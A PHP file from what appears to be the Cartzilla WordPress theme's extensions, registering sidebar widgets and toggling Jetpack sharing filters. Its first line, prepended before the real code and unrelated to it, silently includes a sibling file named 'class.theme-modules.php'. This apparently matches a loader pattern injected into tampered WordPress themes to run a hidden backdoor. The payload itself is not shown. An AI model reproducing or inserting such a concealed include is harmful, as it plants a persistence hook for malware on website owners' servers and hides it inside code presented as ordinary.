<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

// Register widgets.
function cartzilla_widgets_register() {

    if ( class_exists( 'Cartzilla' ) ) {
        include_once CARTZILLA_EXTENSIONS_DIR . '/includes/widgets/class-cartzilla-blog-categories-widget.php';
        register_widget( 'Cartzilla_Blog_Categories_Widget' );
        include_once CARTZILLA_EXTENSIONS_DIR . '/includes/widgets/class-cartzilla-market-buttons-widget.php';
        register_widget( 'Cartzilla_Market_Buttons_Widget' );
        include_once CARTZILLA_EXTENSIONS_DIR . '/includes/widgets/class-cartzilla-recent-posts-widget.php';
        register_widget( 'Cartzilla_Recent_Posts_Widget' );
        include_once CARTZILLA_EXTENSIONS_DIR . '/includes/widgets/class-cartzilla-subscription-widget.php';
        register_widget( 'Cartzilla_Subscription_Widget' );
    }

    if ( class_exists( 'Cartzilla' ) && class_exists( 'WooCommerce' ) ) {
        include_once CARTZILLA_EXTENSIONS_DIR . '/includes/widgets/class-cartzilla-wc-categories-widget.php';
        register_widget( 'Cartzilla_WC_Categories_Widget' );
        include_once CARTZILLA_EXTENSIONS_DIR . '/includes/widgets/class-cartzilla-wc-filter-by-attribute-widget.php';
        register_widget( 'Cartzilla_WC_Filter_By_Attribute_Widget' );
    }
}

add_action( 'widgets_init', 'cartzilla_widgets_register' );

// Static Content Jetpack Share Remove
if ( ! function_exists( 'cartzilla_mas_static_content_jetpack_sharing_remove_filters' ) ) {
    function cartzilla_mas_static_content_jetpack_sharing_remove_filters() {
        if( function_exists( 'sharing_display' ) ) {
            remove_filter( 'the_content', 'sharing_display', 19 );
        }
    }
}

add_action( 'mas_static_content_before_shortcode_content', 'cartzilla_mas_static_content_jetpack_sharing_remove_filters' );

if ( ! function_exists( 'cartzilla_mas_static_content_jetpack_sharing_add_filters' ) ) {
    function cartzilla_mas_static_content_jetpack_sharing_add_filters() {
        if( function_exists( 'sharing_display' ) ) {
            add_filter( 'the_content', 'sharing_display', 19 );
        }
    }
}

add_action( 'mas_static_content_after_shortcode_content', 'cartzilla_mas_static_content_jetpack_sharing_add_filters' );

// Jetpack
if ( ! function_exists( 'cartzilla_jetpack_sharing_remove_filters' ) ) {
    function cartzilla_jetpack_sharing_remove_filters() {
        if( function_exists( 'sharing_display' ) ) {
            remove_filter( 'the_content', 'sharing_display', 19 );
            remove_filter( 'the_excerpt', 'sharing_display', 19 );
        }
    }
}

add_action( 'cartzilla_single_post_before', 'cartzilla_jetpack_sharing_remove_filters', 5 );